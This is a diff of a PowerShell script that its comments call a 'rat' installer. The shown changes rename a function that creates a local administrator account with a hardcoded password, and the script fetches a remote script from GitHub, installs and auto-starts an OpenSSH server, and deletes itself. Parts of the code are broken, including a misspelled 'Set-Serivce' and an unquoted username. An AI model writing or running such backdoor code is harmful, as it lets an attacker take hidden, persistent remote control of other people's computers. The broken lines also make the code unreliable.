@@ -7,33 +7,33 @@ function random_text {
     }
 
 # create local admin for rat (Create_account = Create-NewLocalAdmin = , uname = NewLocalAdmin, pword = Password)
-function Create_account {
+function Create-NewLocalAdmin {
     [CmdletBinding()]
     param (
-        [string] $uname,
-        [securestring] $pword
+        [string] $NewLocalAdmin,
+        [securestring] $Password
     )
     begin {
     }
     process {
-        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
-        Write-Verbose "$uname local user created"
-        Add-LocalGroupMember -LocalGroupMember "Administrators" -Member "$uname"
-        Write-Verbose "$uname added to local administrator group"
+        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
+        Write-Verbose "$NewLocalAdmin local user created"
+        Add-LocalGroupMember -LocalGroupMember "Administrators" -Member "$NewLocalAdmin"
+        Write-Verbose "$NewLocalAdmin added to the local administrator group"
     }
     end {     
     }
 }
+# create admin user
+$NewLocalAdmin = Rat
+$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 #variable
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
-# create admin user
-$uname = "rat"
-$pword = (ConvertTo-SecureString "rat123" -AsPlainText -Force)
-Create_account -uname $uname -pword $pword
 
 # go to temp, make working directory
 mkdir $path
@@ -53,8 +53,6 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-script.v
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Serivce -Name sshd -StartupType 'Automatic'
-#removed for some reason?
-#Get-NetFirewallRule -Name *ssh*
 
 # delete self
 cd $initial_dir
